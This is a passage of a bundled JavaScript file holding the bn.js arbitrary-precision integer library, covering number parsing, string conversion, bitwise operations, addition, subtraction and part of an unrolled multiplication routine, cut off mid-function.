                    return num instanceof BN || (null !== num && "object" == typeof num && num.constructor.wordSize === BN.wordSize && Array.isArray(num.words));
                }),
                    (BN.max = function (left, right) {
                        return left.cmp(right) > 0 ? left : right;
                    }),
                    (BN.min = function (left, right) {
                        return left.cmp(right) < 0 ? left : right;
                    }),
                    (BN.prototype._init = function (number, base, endian) {
                        if ("number" == typeof number) return this._initNumber(number, base, endian);
                        if ("object" == typeof number) return this._initArray(number, base, endian);
                        "hex" === base && (base = 16), assert(base === (0 | base) && base >= 2 && base <= 36);
                        var start = 0;
                        "-" === (number = number.toString().replace(/\s+/g, ""))[0] && (start++, (this.negative = 1)),
                            start < number.length && (16 === base ? this._parseHex(number, start, endian) : (this._parseBase(number, base, start), "le" === endian && this._initArray(this.toArray(), base, endian)));
                    }),
                    (BN.prototype._initNumber = function (number, base, endian) {
                        number < 0 && ((this.negative = 1), (number = -number)),
                            number < 67108864
                                ? ((this.words = [67108863 & number]), (this.length = 1))
                                : number < 4503599627370496
                                ? ((this.words = [67108863 & number, (number / 67108864) & 67108863]), (this.length = 2))
                                : (assert(number < 9007199254740992), (this.words = [67108863 & number, (number / 67108864) & 67108863, 1]), (this.length = 3)),
                            "le" === endian && this._initArray(this.toArray(), base, endian);
                    }),
                    (BN.prototype._initArray = function (number, base, endian) {
                        if ((assert("number" == typeof number.length), number.length <= 0)) return (this.words = [0]), (this.length = 1), this;
                        (this.length = Math.ceil(number.length / 3)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var j,
                            w,
                            off = 0;
                        if ("be" === endian)
                            for (i = number.length - 1, j = 0; i >= 0; i -= 3)
                                (w = number[i] | (number[i - 1] << 8) | (number[i - 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        else if ("le" === endian)
                            for (i = 0, j = 0; i < number.length; i += 3)
                                (w = number[i] | (number[i + 1] << 8) | (number[i + 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        return this.strip();
                    }),
                    (BN.prototype._parseHex = function (number, start, endian) {
                        (this.length = Math.ceil((number.length - start) / 6)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var w,
                            off = 0,
                            j = 0;
                        if ("be" === endian)
                            for (i = number.length - 1; i >= start; i -= 2) (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        else
                            for (i = (number.length - start) % 2 == 0 ? start + 1 : start; i < number.length; i += 2)
                                (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        this.strip();
                    }),
                    (BN.prototype._parseBase = function (number, base, start) {
                        (this.words = [0]), (this.length = 1);
                        for (var limbLen = 0, limbPow = 1; limbPow <= 67108863; limbPow *= base) limbLen++;
                        limbLen--, (limbPow = (limbPow / base) | 0);
                        for (var total = number.length - start, mod = total % limbLen, end = Math.min(total, total - mod) + start, word = 0, i = start; i < end; i += limbLen)
                            (word = parseBase(number, i, i + limbLen, base)), this.imuln(limbPow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        if (0 !== mod) {
                            var pow = 1;
                            for (word = parseBase(number, i, number.length, base), i = 0; i < mod; i++) pow *= base;
                            this.imuln(pow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        }
                        this.strip();
                    }),
                    (BN.prototype.copy = function (dest) {
                        dest.words = new Array(this.length);
                        for (var i = 0; i < this.length; i++) dest.words[i] = this.words[i];
                        (dest.length = this.length), (dest.negative = this.negative), (dest.red = this.red);
                    }),
                    (BN.prototype.clone = function () {
                        var r = new BN(null);
                        return this.copy(r), r;
                    }),
                    (BN.prototype._expand = function (size) {
                        for (; this.length < size; ) this.words[this.length++] = 0;
                        return this;
                    }),
                    (BN.prototype.strip = function () {
                        for (; this.length > 1 && 0 === this.words[this.length - 1]; ) this.length--;
                        return this._normSign();
                    }),
                    (BN.prototype._normSign = function () {
                        return 1 === this.length && 0 === this.words[0] && (this.negative = 0), this;
                    }),
                    (BN.prototype.inspect = function () {
                        return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">";
                    });
                var zeros = [
                        "",
                        "0",
                        "00",
                        "000",
                        "0000",
                        "00000",
                        "000000",
                        "0000000",
                        "00000000",
                        "000000000",
                        "0000000000",
                        "00000000000",
                        "000000000000",
                        "0000000000000",
                        "00000000000000",
                        "000000000000000",
                        "0000000000000000",
                        "00000000000000000",
                        "000000000000000000",
                        "0000000000000000000",
                        "00000000000000000000",
                        "000000000000000000000",
                        "0000000000000000000000",
                        "00000000000000000000000",
                        "000000000000000000000000",
                        "0000000000000000000000000",
                    ],
                    groupSizes = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5],
                    groupBases = [
                        0,
                        0,
                        33554432,
                        43046721,
                        16777216,
                        48828125,
                        60466176,
                        40353607,
                        16777216,
                        43046721,
                        1e7,
                        19487171,
                        35831808,
                        62748517,
                        7529536,
                        11390625,
                        16777216,
                        24137569,
                        34012224,
                        47045881,
                        64e6,
                        4084101,
                        5153632,
                        6436343,
                        7962624,
                        9765625,
                        11881376,
                        14348907,
                        17210368,
                        20511149,
                        243e5,
                        28629151,
                        33554432,
                        39135393,
                        45435424,
                        52521875,
                        60466176,
                    ];
                function smallMulTo(self, num, out) {
                    out.negative = num.negative ^ self.negative;
                    var len = (self.length + num.length) | 0;
                    (out.length = len), (len = (len - 1) | 0);
                    var a = 0 | self.words[0],
                        b = 0 | num.words[0],
                        r = a * b,
                        lo = 67108863 & r,
                        carry = (r / 67108864) | 0;
                    out.words[0] = lo;
                    for (var k = 1; k < len; k++) {
                        for (var ncarry = carry >>> 26, rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                            var i = (k - j) | 0;
                            (ncarry += ((r = (a = 0 | self.words[i]) * (b = 0 | num.words[j]) + rword) / 67108864) | 0), (rword = 67108863 & r);
                        }
                        (out.words[k] = 0 | rword), (carry = 0 | ncarry);
                    }
                    return 0 !== carry ? (out.words[k] = 0 | carry) : out.length--, out.strip();
                }
                (BN.prototype.toString = function (base, padding) {
                    var out;
                    if (((padding = 0 | padding || 1), 16 === (base = base || 10) || "hex" === base)) {
                        out = "";
                        for (var off = 0, carry = 0, i = 0; i < this.length; i++) {
                            var w = this.words[i],
                                word = (16777215 & ((w << off) | carry)).toString(16);
                            (out = 0 !== (carry = (w >>> (24 - off)) & 16777215) || i !== this.length - 1 ? zeros[6 - word.length] + word + out : word + out), (off += 2) >= 26 && ((off -= 26), i--);
                        }
                        for (0 !== carry && (out = carry.toString(16) + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    if (base === (0 | base) && base >= 2 && base <= 36) {
                        var groupSize = groupSizes[base],
                            groupBase = groupBases[base];
                        out = "";
                        var c = this.clone();
                        for (c.negative = 0; !c.isZero(); ) {
                            var r = c.modn(groupBase).toString(base);
                            out = (c = c.idivn(groupBase)).isZero() ? r + out : zeros[groupSize - r.length] + r + out;
                        }
                        for (this.isZero() && (out = "0" + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    assert(!1, "Base should be between 2 and 36");
                }),
                    (BN.prototype.toNumber = function () {
                        var ret = this.words[0];
                        return (
                            2 === this.length
                                ? (ret += 67108864 * this.words[1])
                                : 3 === this.length && 1 === this.words[2]
                                ? (ret += 4503599627370496 + 67108864 * this.words[1])
                                : this.length > 2 && assert(!1, "Number can only safely store up to 53 bits"),
                            0 !== this.negative ? -ret : ret
                        );
                    }),
                    (BN.prototype.toJSON = function () {
                        return this.toString(16);
                    }),
                    (BN.prototype.toBuffer = function (endian, length) {
                        return assert(void 0 !== Buffer), this.toArrayLike(Buffer, endian, length);
                    }),
                    (BN.prototype.toArray = function (endian, length) {
                        return this.toArrayLike(Array, endian, length);
                    }),
                    (BN.prototype.toArrayLike = function (ArrayType, endian, length) {
                        var byteLength = this.byteLength(),
                            reqLength = length || Math.max(1, byteLength);
                        assert(byteLength <= reqLength, "byte array longer than desired length"), assert(reqLength > 0, "Requested array length <= 0"), this.strip();
                        var b,
                            i,
                            littleEndian = "le" === endian,
                            res = new ArrayType(reqLength),
                            q = this.clone();
                        if (littleEndian) {
                            for (i = 0; !q.isZero(); i++) (b = q.andln(255)), q.iushrn(8), (res[i] = b);
                            for (; i < reqLength; i++) res[i] = 0;
                        } else {
                            for (i = 0; i < reqLength - byteLength; i++) res[i] = 0;
                            for (i = 0; !q.isZero(); i++) (b = q.andln(255)), q.iushrn(8), (res[reqLength - i - 1] = b);
                        }
                        return res;
                    }),
                    Math.clz32
                        ? (BN.prototype._countBits = function (w) {
                              return 32 - Math.clz32(w);
                          })
                        : (BN.prototype._countBits = function (w) {
                              var t = w,
                                  r = 0;
                              return t >= 4096 && ((r += 13), (t >>>= 13)), t >= 64 && ((r += 7), (t >>>= 7)), t >= 8 && ((r += 4), (t >>>= 4)), t >= 2 && ((r += 2), (t >>>= 2)), r + t;
                          }),
                    (BN.prototype._zeroBits = function (w) {
                        if (0 === w) return 26;
                        var t = w,
                            r = 0;
                        return 0 == (8191 & t) && ((r += 13), (t >>>= 13)), 0 == (127 & t) && ((r += 7), (t >>>= 7)), 0 == (15 & t) && ((r += 4), (t >>>= 4)), 0 == (3 & t) && ((r += 2), (t >>>= 2)), 0 == (1 & t) && r++, r;
                    }),
                    (BN.prototype.bitLength = function () {
                        var w = this.words[this.length - 1],
                            hi = this._countBits(w);
                        return 26 * (this.length - 1) + hi;
                    }),
                    (BN.prototype.zeroBits = function () {
                        if (this.isZero()) return 0;
                        for (var r = 0, i = 0; i < this.length; i++) {
                            var b = this._zeroBits(this.words[i]);
                            if (((r += b), 26 !== b)) break;
                        }
                        return r;
                    }),
                    (BN.prototype.byteLength = function () {
                        return Math.ceil(this.bitLength() / 8);
                    }),
                    (BN.prototype.toTwos = function (width) {
                        return 0 !== this.negative ? this.abs().inotn(width).iaddn(1) : this.clone();
                    }),
                    (BN.prototype.fromTwos = function (width) {
                        return this.testn(width - 1) ? this.notn(width).iaddn(1).ineg() : this.clone();
                    }),
                    (BN.prototype.isNeg = function () {
                        return 0 !== this.negative;
                    }),
                    (BN.prototype.neg = function () {
                        return this.clone().ineg();
                    }),
                    (BN.prototype.ineg = function () {
                        return this.isZero() || (this.negative ^= 1), this;
                    }),
                    (BN.prototype.iuor = function (num) {
                        for (; this.length < num.length; ) this.words[this.length++] = 0;
                        for (var i = 0; i < num.length; i++) this.words[i] = this.words[i] | num.words[i];
                        return this.strip();
                    }),
                    (BN.prototype.ior = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuor(num);
                    }),
                    (BN.prototype.or = function (num) {
                        return this.length > num.length ? this.clone().ior(num) : num.clone().ior(this);
                    }),
                    (BN.prototype.uor = function (num) {
                        return this.length > num.length ? this.clone().iuor(num) : num.clone().iuor(this);
                    }),
                    (BN.prototype.iuand = function (num) {
                        var b;
                        b = this.length > num.length ? num : this;
                        for (var i = 0; i < b.length; i++) this.words[i] = this.words[i] & num.words[i];
                        return (this.length = b.length), this.strip();
                    }),
                    (BN.prototype.iand = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuand(num);
                    }),
                    (BN.prototype.and = function (num) {
                        return this.length > num.length ? this.clone().iand(num) : num.clone().iand(this);
                    }),
                    (BN.prototype.uand = function (num) {
                        return this.length > num.length ? this.clone().iuand(num) : num.clone().iuand(this);
                    }),
                    (BN.prototype.iuxor = function (num) {
                        var a, b;
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var i = 0; i < b.length; i++) this.words[i] = a.words[i] ^ b.words[i];
                        if (this !== a) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = a.length), this.strip();
                    }),
                    (BN.prototype.ixor = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuxor(num);
                    }),
                    (BN.prototype.xor = function (num) {
                        return this.length > num.length ? this.clone().ixor(num) : num.clone().ixor(this);
                    }),
                    (BN.prototype.uxor = function (num) {
                        return this.length > num.length ? this.clone().iuxor(num) : num.clone().iuxor(this);
                    }),
                    (BN.prototype.inotn = function (width) {
                        assert("number" == typeof width && width >= 0);
                        var bytesNeeded = 0 | Math.ceil(width / 26),
                            bitsLeft = width % 26;
                        this._expand(bytesNeeded), bitsLeft > 0 && bytesNeeded--;
                        for (var i = 0; i < bytesNeeded; i++) this.words[i] = 67108863 & ~this.words[i];
                        return bitsLeft > 0 && (this.words[i] = ~this.words[i] & (67108863 >> (26 - bitsLeft))), this.strip();
                    }),
                    (BN.prototype.notn = function (width) {
                        return this.clone().inotn(width);
                    }),
                    (BN.prototype.setn = function (bit, val) {
                        assert("number" == typeof bit && bit >= 0);
                        var off = (bit / 26) | 0,
                            wbit = bit % 26;
                        return this._expand(off + 1), (this.words[off] = val ? this.words[off] | (1 << wbit) : this.words[off] & ~(1 << wbit)), this.strip();
                    }),
                    (BN.prototype.iadd = function (num) {
                        var r, a, b;
                        if (0 !== this.negative && 0 === num.negative) return (this.negative = 0), (r = this.isub(num)), (this.negative ^= 1), this._normSign();
                        if (0 === this.negative && 0 !== num.negative) return (num.negative = 0), (r = this.isub(num)), (num.negative = 1), r._normSign();
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (r = (0 | a.words[i]) + (0 | b.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        for (; 0 !== carry && i < a.length; i++) (r = (0 | a.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        if (((this.length = a.length), 0 !== carry)) (this.words[this.length] = carry), this.length++;
                        else if (a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return this;
                    }),
                    (BN.prototype.add = function (num) {
                        var res;
                        return 0 !== num.negative && 0 === this.negative
                            ? ((num.negative = 0), (res = this.sub(num)), (num.negative ^= 1), res)
                            : 0 === num.negative && 0 !== this.negative
                            ? ((this.negative = 0), (res = num.sub(this)), (this.negative = 1), res)
                            : this.length > num.length
                            ? this.clone().iadd(num)
                            : num.clone().iadd(this);
                    }),
                    (BN.prototype.isub = function (num) {
                        if (0 !== num.negative) {
                            num.negative = 0;
                            var r = this.iadd(num);
                            return (num.negative = 1), r._normSign();
                        }
                        if (0 !== this.negative) return (this.negative = 0), this.iadd(num), (this.negative = 1), this._normSign();
                        var a,
                            b,
                            cmp = this.cmp(num);
                        if (0 === cmp) return (this.negative = 0), (this.length = 1), (this.words[0] = 0), this;
                        cmp > 0 ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (carry = (r = (0 | a.words[i]) - (0 | b.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        for (; 0 !== carry && i < a.length; i++) (carry = (r = (0 | a.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        if (0 === carry && i < a.length && a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = Math.max(this.length, i)), a !== this && (this.negative = 1), this.strip();
                    }),
                    (BN.prototype.sub = function (num) {
                        return this.clone().isub(num);
                    });
                var comb10MulTo = function (self, num, out) {
                    var lo,
                        mid,
                        hi,
                        a = self.words,
                        b = num.words,
                        o = out.words,
                        c = 0,
                        a0 = 0 | a[0],
                        al0 = 8191 & a0,
                        ah0 = a0 >>> 13,
                        a1 = 0 | a[1],
                        al1 = 8191 & a1,
                        ah1 = a1 >>> 13,
                        a2 = 0 | a[2],
                        al2 = 8191 & a2,
                        ah2 = a2 >>> 13,
                        a3 = 0 | a[3],
                        al3 = 8191 & a3,
                        ah3 = a3 >>> 13,
                        a4 = 0 | a[4],
                        al4 = 8191 & a4,
                        ah4 = a4 >>> 13,
                        a5 = 0 | a[5],
                        al5 = 8191 & a5,
                        ah5 = a5 >>> 13,
                        a6 = 0 | a[6],
                        al6 = 8191 & a6,
                        ah6 = a6 >>> 13,
                        a7 = 0 | a[7],
                        al7 = 8191 & a7,
                        ah7 = a7 >>> 13,
                        a8 = 0 | a[8],
                        al8 = 8191 & a8,
                        ah8 = a8 >>> 13,
                        a9 = 0 | a[9],
                        al9 = 8191 & a9,
                        ah9 = a9 >>> 13,
                        b0 = 0 | b[0],
                        bl0 = 8191 & b0,
                        bh0 = b0 >>> 13,
                        b1 = 0 | b[1],
                        bl1 = 8191 & b1,
                        bh1 = b1 >>> 13,
                        b2 = 0 | b[2],
                        bl2 = 8191 & b2,
                        bh2 = b2 >>> 13,
                        b3 = 0 | b[3],
                        bl3 = 8191 & b3,
                        bh3 = b3 >>> 13,
                        b4 = 0 | b[4],
                        bl4 = 8191 & b4,
                        bh4 = b4 >>> 13,
                        b5 = 0 | b[5],
                        bl5 = 8191 & b5,
                        bh5 = b5 >>> 13,
                        b6 = 0 | b[6],
                        bl6 = 8191 & b6,
                        bh6 = b6 >>> 13,
                        b7 = 0 | b[7],
                        bl7 = 8191 & b7,
                        bh7 = b7 >>> 13,
                        b8 = 0 | b[8],
                        bl8 = 8191 & b8,
                        bh8 = b8 >>> 13,
                        b9 = 0 | b[9],
                        bl9 = 8191 & b9,
                        bh9 = b9 >>> 13;
                    (out.negative = self.negative ^ num.negative), (out.length = 19);
                    var w0 = (((c + (lo = Math.imul(al0, bl0))) | 0) + ((8191 & (mid = ((mid = Math.imul(al0, bh0)) + Math.imul(ah0, bl0)) | 0)) << 13)) | 0;
                    (c = ((((hi = Math.imul(ah0, bh0)) + (mid >>> 13)) | 0) + (w0 >>> 26)) | 0), (w0 &= 67108863), (lo = Math.imul(al1, bl0)), (mid = ((mid = Math.imul(al1, bh0)) + Math.imul(ah1, bl0)) | 0), (hi = Math.imul(ah1, bh0));
                    var w1 = (((c + (lo = (lo + Math.imul(al0, bl1)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh1)) | 0) + Math.imul(ah0, bl1)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh1)) | 0) + (mid >>> 13)) | 0) + (w1 >>> 26)) | 0),
                        (w1 &= 67108863),
                        (lo = Math.imul(al2, bl0)),
                        (mid = ((mid = Math.imul(al2, bh0)) + Math.imul(ah2, bl0)) | 0),
                        (hi = Math.imul(ah2, bh0)),
                        (lo = (lo + Math.imul(al1, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh1)) | 0) + Math.imul(ah1, bl1)) | 0),
                        (hi = (hi + Math.imul(ah1, bh1)) | 0);
                    var w2 = (((c + (lo = (lo + Math.imul(al0, bl2)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh2)) | 0) + Math.imul(ah0, bl2)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh2)) | 0) + (mid >>> 13)) | 0) + (w2 >>> 26)) | 0),
                        (w2 &= 67108863),
                        (lo = Math.imul(al3, bl0)),
                        (mid = ((mid = Math.imul(al3, bh0)) + Math.imul(ah3, bl0)) | 0),
                        (hi = Math.imul(ah3, bh0)),
                        (lo = (lo + Math.imul(al2, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh1)) | 0) + Math.imul(ah2, bl1)) | 0),
                        (hi = (hi + Math.imul(ah2, bh1)) | 0),
                        (lo = (lo + Math.imul(al1, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh2)) | 0) + Math.imul(ah1, bl2)) | 0),
                        (hi = (hi + Math.imul(ah1, bh2)) | 0);
                    var w3 = (((c + (lo = (lo + Math.imul(al0, bl3)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh3)) | 0) + Math.imul(ah0, bl3)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh3)) | 0) + (mid >>> 13)) | 0) + (w3 >>> 26)) | 0),
                        (w3 &= 67108863),
                        (lo = Math.imul(al4, bl0)),
                        (mid = ((mid = Math.imul(al4, bh0)) + Math.imul(ah4, bl0)) | 0),
                        (hi = Math.imul(ah4, bh0)),
                        (lo = (lo + Math.imul(al3, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh1)) | 0) + Math.imul(ah3, bl1)) | 0),
                        (hi = (hi + Math.imul(ah3, bh1)) | 0),
                        (lo = (lo + Math.imul(al2, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh2)) | 0) + Math.imul(ah2, bl2)) | 0),
                        (hi = (hi + Math.imul(ah2, bh2)) | 0),
                        (lo = (lo + Math.imul(al1, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh3)) | 0) + Math.imul(ah1, bl3)) | 0),
                        (hi = (hi + Math.imul(ah1, bh3)) | 0);
                    var w4 = (((c + (lo = (lo + Math.imul(al0, bl4)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh4)) | 0) + Math.imul(ah0, bl4)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh4)) | 0) + (mid >>> 13)) | 0) + (w4 >>> 26)) | 0),
                        (w4 &= 67108863),
                        (lo = Math.imul(al5, bl0)),
                        (mid = ((mid = Math.imul(al5, bh0)) + Math.imul(ah5, bl0)) | 0),
                        (hi = Math.imul(ah5, bh0)),
                        (lo = (lo + Math.imul(al4, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh1)) | 0) + Math.imul(ah4, bl1)) | 0),
                        (hi = (hi + Math.imul(ah4, bh1)) | 0),
                        (lo = (lo + Math.imul(al3, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh2)) | 0) + Math.imul(ah3, bl2)) | 0),
                        (hi = (hi + Math.imul(ah3, bh2)) | 0),
                        (lo = (lo + Math.imul(al2, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh3)) | 0) + Math.imul(ah2, bl3)) | 0),
                        (hi = (hi + Math.imul(ah2, bh3)) | 0),
                        (lo = (lo + Math.imul(al1, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh4)) | 0) + Math.imul(ah1, bl4)) | 0),
                        (hi = (hi + Math.imul(ah1, bh4)) | 0);
                    var w5 = (((c + (lo = (lo + Math.imul(al0, bl5)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh5)) | 0) + Math.imul(ah0, bl5)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh5)) | 0) + (mid >>> 13)) | 0) + (w5 >>> 26)) | 0),
                        (w5 &= 67108863),
                        (lo = Math.imul(al6, bl0)),
                        (mid = ((mid = Math.imul(al6, bh0)) + Math.imul(ah6, bl0)) | 0),
                        (hi = Math.imul(ah6, bh0)),
                        (lo = (lo + Math.imul(al5, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh1)) | 0) + Math.imul(ah5, bl1)) | 0),
                        (hi = (hi + Math.imul(ah5, bh1)) | 0),
                        (lo = (lo + Math.imul(al4, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh2)) | 0) + Math.imul(ah4, bl2)) | 0),
                        (hi = (hi + Math.imul(ah4, bh2)) | 0),
                        (lo = (lo + Math.imul(al3, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh3)) | 0) + Math.imul(ah3, bl3)) | 0),
                        (hi = (hi + Math.imul(ah3, bh3)) | 0),
                        (lo = (lo + Math.imul(al2, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh4)) | 0) + Math.imul(ah2, bl4)) | 0),
                        (hi = (hi + Math.imul(ah2, bh4)) | 0),
                        (lo = (lo + Math.imul(al1, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh5)) | 0) + Math.imul(ah1, bl5)) | 0),
                        (hi = (hi + Math.imul(ah1, bh5)) | 0);
                    var w6 = (((c + (lo = (lo + Math.imul(al0, bl6)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh6)) | 0) + Math.imul(ah0, bl6)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh6)) | 0) + (mid >>> 13)) | 0) + (w6 >>> 26)) | 0),
                        (w6 &= 67108863),
                        (lo = Math.imul(al7, bl0)),
                        (mid = ((mid = Math.imul(al7, bh0)) + Math.imul(ah7, bl0)) | 0),
                        (hi = Math.imul(ah7, bh0)),
                        (lo = (lo + Math.imul(al6, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh1)) | 0) + Math.imul(ah6, bl1)) | 0),
                        (hi = (hi + Math.imul(ah6, bh1)) | 0),
                        (lo = (lo + Math.imul(al5, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh2)) | 0) + Math.imul(ah5, bl2)) | 0),
                        (hi = (hi + Math.imul(ah5, bh2)) | 0),
                        (lo = (lo + Math.imul(al4, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh3)) | 0) + Math.imul(ah4, bl3)) | 0),
                        (hi = (hi + Math.imul(ah4, bh3)) | 0),
                        (lo = (lo + Math.imul(al3, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh4)) | 0) + Math.imul(ah3, bl4)) | 0),
                        (hi = (hi + Math.imul(ah3, bh4)) | 0),
                        (lo = (lo + Math.imul(al2, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh5)) | 0) + Math.imul(ah2, bl5)) | 0),
                        (hi = (hi + Math.imul(ah2, bh5)) | 0),
                        (lo = (lo + Math.imul(al1, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh6)) | 0) + Math.imul(ah1, bl6)) | 0),
                        (hi = (hi + Math.imul(ah1, bh6)) | 0);
                    var w7 = (((c + (lo = (lo + Math.imul(al0, bl7)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh7)) | 0) + Math.imul(ah0, bl7)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh7)) | 0) + (mid >>> 13)) | 0) + (w7 >>> 26)) | 0),
                        (w7 &= 67108863),
                        (lo = Math.imul(al8, bl0)),
                        (mid = ((mid = Math.imul(al8, bh0)) + Math.imul(ah8, bl0)) | 0),
                        (hi = Math.imul(ah8, bh0)),
                        (lo = (lo + Math.imul(al7, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh1)) | 0) + Math.imul(ah7, bl1)) | 0),
                        (hi = (hi + Math.imul(ah7, bh1)) | 0),
                        (lo = (lo + Math.imul(al6, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh2)) | 0) + Math.imul(ah6, bl2)) | 0),
                        (hi = (hi + Math.imul(ah6, bh2)) | 0),
                        (lo = (lo + Math.imul(al5, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh3)) | 0) + Math.imul(ah5, bl3)) | 0),
                        (hi = (hi + Math.imul(ah5, bh3)) | 0),
                        (lo = (lo + Math.imul(al4, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh4)) | 0) + Math.imul(ah4, bl4)) | 0),
                        (hi = (hi + Math.imul(ah4, bh4)) | 0),
                        (lo = (lo + Math.imul(al3, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh5)) | 0) + Math.imul(ah3, bl5)) | 0),
                        (hi = (hi + Math.imul(ah3, bh5)) | 0),
                        (lo = (lo + Math.imul(al2, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh6)) | 0) + Math.imul(ah2, bl6)) | 0),
                        (hi = (hi + Math.imul(ah2, bh6)) | 0),
                        (lo = (lo + Math.imul(al1, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh7)) | 0) + Math.imul(ah1, bl7)) | 0),
                        (hi = (hi + Math.imul(ah1, bh7)) | 0);
                    var w8 = (((c + (lo = (lo + Math.imul(al0, bl8)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh8)) | 0) + Math.imul(ah0, bl8)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh8)) | 0) + (mid >>> 13)) | 0) + (w8 >>> 26)) | 0),
                        (w8 &= 67108863),
                        (lo = Math.imul(al9, bl0)),
                        (mid = ((mid = Math.imul(al9, bh0)) + Math.imul(ah9, bl0)) | 0),
                        (hi = Math.imul(ah9, bh0)),
                        (lo = (lo + Math.imul(al8, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh1)) | 0) + Math.imul(ah8, bl1)) | 0),
                        (hi = (hi + Math.imul(ah8, bh1)) | 0),
                        (lo = (lo + Math.imul(al7, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh2)) | 0) + Math.imul(ah7, bl2)) | 0),
                        (hi = (hi + Math.imul(ah7, bh2)) | 0),
                        (lo = (lo + Math.imul(al6, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh3)) | 0) + Math.imul(ah6, bl3)) | 0),
                        (hi = (hi + Math.imul(ah6, bh3)) | 0),
